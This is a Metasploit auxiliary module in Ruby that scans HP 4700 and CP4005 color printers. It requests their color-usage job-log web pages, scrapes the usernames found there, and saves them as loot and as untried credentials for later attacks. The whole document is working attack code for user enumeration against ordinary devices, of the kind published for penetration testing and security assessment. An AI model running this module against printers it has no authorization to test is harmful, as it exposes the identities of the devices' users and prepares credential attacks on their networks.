#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'HP 4700 and CP4005 color job username exractor',
      'Description'    => %{
        This module scans HP 4700 and CP4005  color printers and harvests the usernames from the color job log file.
      },
      'Author'         =>
        [
          'Deral "Percentx" Heiland',
          'Pete "Bokojan" Arzamendi'
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", false]),
        OptInt.new('RPORT', [ true, "The target port", 80]),
        OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20])
      ], self.class)
  end

  def run_host(ip)
    @uri_page = "/hp/device/this.LCDispatcher?nav=hp.ColorUsage"
    print_status("Attempting to enumerate usernames from: #{rhost}")
    jobs = get_number_of_jobs(rhost)
    return if jobs.nil?

    users = get_usernames(jobs)
    return if users.nil?

    usernames = ""

    unless users.blank?
      users.each do | user |
        usernames << user << "\n"
      end
    end

      #Woot we got usernames so lets save them.
      print_good( "Found the following users: #{users}")
      loot_name     = "hp.cp.usernames"
      loot_type     = "text/plain"
      loot_filename = "hp-usernames.text"
      loot_desc     = "HP CP Username Harvester"
      p = store_loot(loot_name, loot_type, datastore['RHOST'], usernames , loot_filename, loot_desc)
      print_status("Credentials saved in: #{p.to_s}")

    users.each do | user |
       register_creds('HP-HTTP', rhost, '80', user, "")
    end

  end

  def get_number_of_jobs(rhost)
    begin
      res = send_request_cgi(
        {
          'uri'       => @uri_page,
          'method'    => 'GET'
        }, datastore['TIMEOUT'].to_i)
      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      print_error("#{rhost}:#{rport} - Connection failed.")
      return :abort
    end

     if res == nil
        print_error("#{rhost}:#{rport} - Connection failed.")
        return
      end

      html_body = ::Nokogiri::HTML(res.body)
      data_to_parse_for_jobs = html_body.xpath('//*[@id="Text6"]')
      #check to see if the number of jobs is empty. If so return zero my friend.
      unless data_to_parse_for_jobs.empty?
        return data_to_parse_for_jobs.text
      end

      return number_of_jobs = 0
  end


  def get_usernames(jobs)
    pages = jobs[0].to_i
    usernames = []
    while pages >= 0 do
      user_record_page = "#{@uri_page}&startRecord=#{pages}"
      begin
        res = send_request_cgi(
          {
            'uri'       => user_record_page,
            'method'    => 'GET'
          }, datastore['TIMEOUT'].to_i)
      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
        print_error("#{rhost}:#{rport} - Connection failed.")
        return
      end

       if res == nil
        print_error("#{rhost}:#{rport} - Connection failed.")
        return
      end

      html_body = ::Nokogiri::HTML(res.body)
      data = html_body.xpath('/html/body/div/table/tr/td/div/div/div/table/tr/td/table/tr/td[2]')
      data.collect do | line |
        if line.content.strip.empty?
          next
        else
          usernames << line.content.strip
        end
      end
      pages -= 100
    end
    return usernames.uniq
  end

  def register_creds (service_name, remote_host, remote_port, username, password)
    credential_data = {
       origin_type: :service,
       module_fullname: self.fullname,
       workspace_id: myworkspace.id,
       private_data: password,
       username: username,
       }

    service_data = {
      address: remote_host,
      port: remote_port,
      service_name: service_name,
      protocol: 'tcp',
      workspace_id: myworkspace_id
      }

    credential_data.merge!(service_data)
    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED,
      workspace_id: myworkspace_id
    }

    login_data.merge!(service_data)
    create_credential_login(login_data)
  end

end
